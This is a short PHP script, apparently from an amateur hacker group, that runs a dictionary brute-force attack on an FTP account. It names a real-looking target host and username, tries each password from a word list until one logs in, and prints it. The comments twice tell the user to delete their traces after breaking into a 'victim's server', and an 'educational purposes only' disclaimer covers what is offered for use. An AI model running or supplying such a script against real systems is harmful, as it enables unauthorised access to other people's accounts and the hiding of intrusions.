<?php
/*
* This simple FTp brute forcer script is coded by
* ^cybergang007^. I am in no way responsible for
* any serious job you do with this piece of code.
* Intended for educational purposes only.
*
* This bad script probes an FTP dictionary attack
*
* @Email      : <soteres2002@greeknetizen.net>
* @URL        : http://www.greeknetizen.net/
* @DESCTIPTION:
* This PHP script tries a password 
* from the password file each time intil it finds it.
* Execute it from a webpage on your server, not from
* the command line(!). And remember to clear your
* traces if you succeed in cracking the password
* of the FTP account you desire. And once again,
* I am not responsible for any of your actions
* with this code.
*/

error_reporting(E_PARSE); //we want any exception except from WARNING MESSAGES
set_time_limit(0); // set the time limit for the script to +oo

$passwordfile = "passwd.dic";   //this is the path to the passwordfile
$targethost = "www.bahoosh.net"; //change this to the host you want to attack
$usrname = "bahoosh"; // change this to the username
                                              // of the FTP account you want
                                              // to attack
$interval = 1; // this is the break the script each time it tries a password
               // do not set this to zero

//change the second arguments you desire
$crh = "Sorry, the host you specified cannot be retrieved!";
$cc = "<font color=\"red\">Sorry, I cannot connect to $targethost with <b>$username</b> and password: $trypassword</font><br>";


/* DO NOT CHAGE ANYTHING BELOW THIS LINE UNLESS YOU REALLY KNOW WHAT YOU ARE DOING */

if(!file_exists($passwordfile)) {
	die("Sorry, the passwordfile <b>$passwordfile</b> cannot be retrieved");
} else {
	// open connection funtion
        function openconnection($targethost,$username,$trypassword) {
			print "<hr>Trying password <b>$trypassword</b> for <b>".$username."</b> to $targethost<hr><br>";
			$ftp_conn = @ftp_connect($targethost) or print $crh;
			if($ftp_conn) {
				$trylogin = @ftp_login($ftp_conn,$username,$trypassword);
					if(!$trylogin) {
						print $cc;
					} else {
						print "<b><font color=\"red\">The password is: $trypassword</font></b><br>";
						@ftp_quit($ftp_conn);
						break;
					}
			}
		}
        //end of function

        // try to open the password file
	$fp = @fopen($passwordfile,"r");
	if(!$fp) {
		die("The password file cannot open");
	} else {
		print "<b>The passwordfile is forked!</b>";
		//get the passwords
		while($trypassword = @fgets($fp,1024)) {
			openconnection($targethost,$usrname,$trypassword);
			sleep($interval);
		}
	}
	//...and close the password file or die of errors
	@fclose($fp) or die("\n<br>\nCannot close the password file!\n");
	echo "<b>The password file has closed";
 
}

// when you succeed connecting to your victim's server
// do not forget to delete your traces
?>
